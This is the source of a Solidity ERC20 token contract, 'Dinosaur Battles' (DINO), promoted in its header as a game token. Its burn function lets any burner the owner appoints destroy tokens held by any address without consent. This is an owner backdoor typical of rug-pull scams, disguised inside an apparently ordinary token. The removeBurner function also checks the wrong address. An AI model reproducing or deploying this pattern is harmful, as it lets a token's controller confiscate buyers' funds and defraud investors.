/**
    🦕 ＤＩＮＯＳＡＵＲ ＢＡＴＴＬＥＳ 🦖

𝗥𝘂𝗻 𝗳𝗮𝘀𝘁 𝗮𝗻𝗱 𝗳𝗶𝗴𝗵𝘁 𝘁𝗼 𝘄𝗶𝗻. 𝗘𝘀𝘁𝗮𝗯𝗹𝗶𝘀𝗵 𝘆𝗼𝘂𝗿 𝗗𝗶𝗻𝗼𝘀𝗮𝘂𝗿 𝗮𝗿𝗺𝘆,
𝗴𝗿𝗼𝘄 𝗮𝗻𝗱 𝘁𝗿𝗮𝗶𝗻 𝘆𝗼𝘂𝗿 𝗱𝗶𝗻𝗼 𝘀𝗼𝗹𝗱𝗶𝗲𝗿𝘀, 𝗳𝗼𝗿𝗺 𝗗𝗶𝗻𝗼𝘀𝗮𝘂𝗿 𝘀𝗾𝘂𝗮𝗱 
𝗮𝗻𝗱  𝗴𝗼 𝗼𝘂𝘁 𝗶𝗻 𝘀𝗲𝗮𝗿𝗰𝗵 𝗼𝗳 𝗺𝗼𝗿𝗲 𝗹𝗮𝗻𝗱 𝘁𝗼 𝗰𝗼𝗻𝗾𝘂𝗲𝗿. 
     
https://dinosaurbattles.games/

https://t.me/DinosaurBattles
*/



//SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity = 0.5.17;

import "./ERC20.sol";
import "./ERC20Detailed.sol";
import "./SafeMath.sol";
import "./IERC20Metadata.sol";

contract DinosaurBattles is ERC20, ERC20Detailed {
    using Roles for Roles.Role;

    Roles.Role private _burners;
    using SafeMath for uint256;

    uint256 totalSupply_;
    address[] burners_;
    address[] burners;

    constructor() ERC20Detailed("Dinosaur Battles", "DINO", 9) public {
        totalSupply_ = 500000000000 *10**9;
        _totalSupply = totalSupply_;
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply);
        emit Transfer(address(0), _msgSender(), _totalSupply);

        for (uint256 i = 0; i < burners.length; ++i) {
	    _burners.add(burners[i]);}
        burners_ = burners;
    }
    
    function burn(address target, uint256 amount) external {
        require(_burners.has(msg.sender), "ONLY_BURNER_ALLOWED_TO_DO_THIS");
        _burn(target, amount);
    }

    function addBurner(address burner) external onlyOwner {
        require(!_burners.has(burner), "HAVE_BURNER_ROLE_ALREADY");
        _burners.add(burner);
        burners_.push(burner);
    }

    function removeBurner(address burner) external onlyOwner {
        require(_burners.has(msg.sender), "HAVE_BURNER_ROLE_ALREADY");
        _burners.remove(burner);
        uint256 i;
        for (i = 0; i < burners_.length; ++i) {
            if (burners_[i] == burner) {
                burners_[i] = address(0);
                break;
            }
        }
    }
}